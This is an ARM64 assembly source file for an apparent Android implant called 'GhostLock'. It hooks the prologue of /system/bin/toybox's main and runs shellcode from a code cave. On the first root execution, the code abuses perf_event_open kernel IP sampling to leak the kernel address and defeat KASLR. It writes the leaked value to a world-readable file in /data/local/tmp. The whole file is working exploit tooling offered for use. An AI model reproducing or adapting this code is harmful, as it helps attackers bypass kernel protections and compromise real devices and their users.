/* bkl_slide_toybox.s — GhostLock BKL-L09 slide leaker (rev 7b, toybox host) * * HOST: /system/bin/toybox, hooked at main's prologue. *   hook site 0x29050: sub sp, sp, #0x80   (0xd10203ff) *   branch-back 0x29054, cave 0x6b970 (1680 B executable tail) *   Context: main(argc, argv, envp) — fully initialized process: *   TLS up, pthreads sane, libc complete. x0/x1/x2 ARE argc/argv/envp. * * DESIGN (synchronous worker, no fork — fork unnecessary in this context): *   every exec through hooked main: *     geteuid != 0  -> instant clean return (every adb shell command) *     gl.slide exists -> one openat (EEXIST), instant return *     first root exec (dumpstate's df, etc.) -> THE WORKER, once, ~1ms: *       perf_event_open(IP-only, period 1, self) *       mmap 3-page ring, ENABLE, 100 gettid storm, DISABLE *       read sample[0].IP, write 8 raw bytes to gl.slide, fchmod 0666 * * rev 7a lineage (libc-host design) with: *   - hook-site replicate changed to 0xd10203ff (sub sp,sp,#0x80) *   - branch-back 0x29054 (TOOL PATCHES THE LAST WORD — do not hand-edit) *   - worker registers: caller-saved only, x19-x28 NEVER touched *   - placeholder is the literal last word of the file * * OUTPUT: /data/local/tmp/gl.slide, 8 raw LE bytes = sample[0] kernel IP, *         or FF x8 sentinel if no sample was captured. * DECODE: slide = (v & ~0x1FFFFF) + 0x81000 */    .text    .globl _start    .balign 4_start:    /* === wrapper: save main args x0 x1 x2 and LR === */    stp     x2, x30, [sp, #-16]!    stp     x0, x1, [sp, #-16]!    /* === gate: effective root only (fast path for every shell command) === */    mov     x8, #175                    /* geteuid */    svc     #0    cbnz    x0, w_ret                   /* not root: clean return */    /* === open gl.slide O_WRONLY|O_CREAT|O_EXCL 0644 ===       doubles as the fast-path existence check (EEXIST = done) */    mov     x0, #-100                   /* AT_FDCWD */    adr     x1, slide_path    mov     w2, #0xC1                   /* 1|0x40|0x80 */    mov     w3, #0x1A4                  /* 0644 */    mov     w8, #56                     /* openat */    svc     #0    cmp     x0, #0    b.le    w_ret                       /* exists: done. failed: next root retries */    mov     x6, x0                      /* x6 = slide fd */    /* === fchmod(fd, 0666): umask-proof readability === */    mov     w1, #0x1B6    mov     w8, #52                     /* fchmod */    svc     #0    /* === worker frame (below the saved args, untouched) === */    sub     sp, sp, #0x60    /* === perf_event_attr: 64 bytes zeroed, VER0 === */    stp     xzr, xzr, [sp, #0x00]    stp     xzr, xzr, [sp, #0x10]    stp     xzr, xzr, [sp, #0x20]    stp     xzr, xzr, [sp, #0x30]    /* type=1 SW | size=64 -> 0x0000004000000001 */    movz    x9, #1    movk    x9, #0x40, lsl #32    str     x9, [sp, #0x00]    /* period=1 and sample_type=PERF_SAMPLE_IP=1 share the value */    mov     x9, #1    str     x9, [sp, #0x10]    str     x9, [sp, #0x18]    /* flags = disabled|exclude_user|exclude_hv = 0x51 */    movz    x9, #0x51    str     x9, [sp, #0x28]    /* === perf_event_open(&attr, 0, -1, -1, 0) — self, any cpu === */    add     x0, sp, #0    mov     x1, #0    mov     x2, #-1    mov     x3, #-1    mov     x4, #0    mov     w8, #241    svc     #0    cmp     x0, #0    b.le    fail                        /* no CAP_SYS_ADMIN in this domain: sentinel */    mov     x7, x0                      /* x7 = perf fd */    /* === mmap 3 pages shared rw: 1 meta + 2 data === */    mov     x0, #0    mov     x1, #0x3000    mov     x2, #3                      /* PROT_READ|PROT_WRITE */    mov     x3, #1                      /* MAP_SHARED */    mov     x4, x7    mov     x5, #0    mov     w8, #222    svc     #0    cmp     x0, #0    b.le    fail    mov     x10, x0                      /* x10 = mmap base */    /* === ioctl ENABLE (full setup) === */    mov     x0, x7    mov     w1, #0x2400    mov     x2, #0    mov     w8, #29    svc     #0    /* === storm: 100 gettid; x5 and x8 survive each svc === */    mov     x5, #100    mov     w8, #178storm:    svc     #0    subs    x5, x5, #1    b.ne    storm    /* === ioctl DISABLE (x2 still 0: kernel preserved it) === */    mov     w1, #0x2401    mov     x0, x7    mov     w8, #29    svc     #0    /* === read sample[0].IP: ring at base+0x1000 (3-page mapping),           IP field at +8 — verified geometry, one instruction === */    ldr     x2, [x10, #0x1008]           /* sample[0].IP */    b       do_writefail:    mov     x2, #-1                     /* sentinel: operator rm + re-trigger */do_write:    str     x2, [sp, #0x50]    mov     x0, x6                      /* slide fd */    add     x1, sp, #0x50    mov     x2, #8    mov     w8, #64                     /* write */    svc     #0    add     sp, sp, #0x60               /* unwind worker frame */    b       w_ret/* ============ DATA ============ */    .balign 4slide_path:    .asciz "/data/local/tmp/gl.slide"    .balign 4                    /* alignment gate: data/code junction *//* ============ RETURN ============ */w_ret:    ldp     x0, x1, [sp], #16    ldp     x2, x30, [sp], #16    sub     sp, sp, #0x80              /* replicate hooked insn 0xd10203ff (main prologue) */    .balign 4exit:    b       .                           /* LAST WORD: tool patches to b 0x29054 */